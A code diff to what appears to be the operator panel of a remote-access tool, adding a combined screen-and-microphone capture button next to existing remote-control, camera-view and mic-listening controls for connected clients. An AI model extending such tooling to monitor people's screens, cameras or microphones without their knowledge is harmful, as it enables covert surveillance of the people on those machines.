@@ -18,6 +18,7 @@
     <div id="clientsList" class="clients"></div>
     <div id="controls" class="hidden" style="margin-top: 15px;">
         <button id="viewScreenBtn" style="background: #28a745;">🖥️ View Screen</button>
+        <button id="viewScreenMicBtn" style="background: #e83e8c;">🖥️+🎙️ Screen & Mic</button>
         <button id="remoteControlBtn" style="background: #dc3545;">🎮 Remote Control</button>
         <button id="viewCameraBtn" style="background: #ffc107; color: black;">📷 View Camera</button>
         <button id="listenMicBtn" style="background: #17a2b8;">🎙️ Listen Mic</button>
@@ -124,7 +125,7 @@
         }
 
         function stopCurrentActive() {
-            if (activeType === 'screen' || activeType === 'remote') {
+            if (activeType === 'screen' || activeType === 'remote' || activeType === 'screen-mic') {
                 socket.emit('stop-screen', activeTarget);
                 document.getElementById('remote-tools').classList.add('hidden');
                 if (peerConnection) peerConnection.close();
@@ -158,6 +159,16 @@
             document.getElementById('preview-video').muted = false;
             document.getElementById('title').innerText = "Viewing Screen: " + activeTarget;
             socket.emit('request-screen', activeTarget);
+        };
+
+        document.getElementById('viewScreenMicBtn').onclick = () => {
+            if (activeType === 'screen-mic') return;
+            stopCurrentActive();
+            activeType = 'screen-mic';
+            document.getElementById('preview-video').classList.remove('hidden');
+            document.getElementById('preview-video').muted = false;
+            document.getElementById('title').innerText = "Viewing Screen + Mic: " + activeTarget;
+            socket.emit('request-screen-mic', activeTarget);
         };
 
         document.getElementById('remoteControlBtn').onclick = () => {
